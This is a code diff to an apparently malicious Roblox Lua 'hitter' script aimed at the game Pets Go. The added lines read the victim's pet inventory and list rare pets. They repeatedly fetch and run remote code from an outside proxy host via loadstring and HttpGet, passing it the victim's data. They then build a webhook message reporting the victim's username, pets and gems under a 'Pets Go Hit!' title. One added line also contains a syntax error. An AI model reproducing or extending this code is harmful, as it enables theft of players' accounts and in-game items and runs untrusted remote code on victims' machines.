@@ -31,7 +31,8 @@ pcall(function() xxxvvv=response.StatusMessage end)
 if typeof(xxxvvv)~="string" then xxxvvv="Lolly" end
 if not _G.User then _G.User="yve (pet change hit)" end
 local big = 0
-pcall(function()
+local qbig,qbiga
+qbig, qbiga = pcall(function()
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 save = save.Get()
@@ -41,12 +42,39 @@ big = require(dir[v.id]).difficulty
 end
 end
 big = "1/"..big
+local biggy = big.." (".._G.Min..")"
+big = ""
+local tab = {}
+for i,v in pairs(save.Inventory.Pet) do
+if require(dir[v.id]).difficulty >= _G.Min then
+table.insert(tab, {v.id, require(dir[v.id]).difficulty, (v._am or 1)})
+end
+end
+if #tab >= 1 then
+for i,v in pairs(tab) do
+big=big..v[3].."x "..v[1].."(1/"..v[2]..")\\n"
+end
+big=big.."(TEST)"
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
+else
+big = "No pets over 1/".._G.Min.." :("
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
+end
 end)
+if big = "" then
+big = "No pets over 1/".._G.Min.." :("
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
+end
+if not qbig then
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
+end
 local log = ""
 if dh then
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Best Pet","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
 end
 local responser =
         request(
